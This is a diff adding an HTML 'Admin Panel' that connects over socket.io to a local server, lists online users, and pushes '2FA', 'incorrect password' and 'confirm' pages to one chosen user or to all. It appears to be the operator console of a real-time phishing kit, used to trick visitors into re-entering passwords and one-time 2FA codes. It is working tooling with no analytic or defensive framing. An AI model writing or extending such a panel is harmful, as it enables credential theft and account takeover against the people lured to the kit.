@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Admin Panel</title>
+
+</head>
+
+<body>
+    <div>Online Users ID
+        <div id="messages"></div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.js"
+        integrity="sha512-xbQU0+iHqhVt7VIXi6vBJKPh3IQBF5B84sSHdjKiSccyX/1ZI7Vnkt2/8y8uruj63/DVmCxfUNohPNruthTEQA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <script>
+        var socket = io('http://localhost:3000');
+
+        socket.on("admin", function (data) {
+            document.getElementById('userList').innerHTML = data
+        });
+
+        function sendMessage(form) {
+            let to = document.getElementById('toUser').value;
+
+            socket.emit("send-form", { to, form })
+        }
+
+        function sendToAll(form) {
+            socket.emit("send-form-all", { form })
+        }
+    </script>
+    <!-- Display online user list -->
+    <ul id="userList"></ul>
+
+    <!-- Send message form -->
+    <input type="text" id="toUser" placeholder="To User">
+    <br><br>
+        <button onclick="sendMessage('2fa.html')">Send 2FA</button>
+        <button onclick="sendMessage('incPw.html')">Send incPW</button>
+        <button onclick="sendMessage('confirm.html')">Send Confirm</button>
+    <br><br>
+        <button onclick="sendToAll('2fa.html')">Send 2FA to All Users</button>
+        <button onclick="sendToAll('incPw.html')">Send incPW to All Users</button>
+        <button onclick="sendToAll('confirm.html')">Send Confirm to All Users</button>
+</body>
+
+</html>
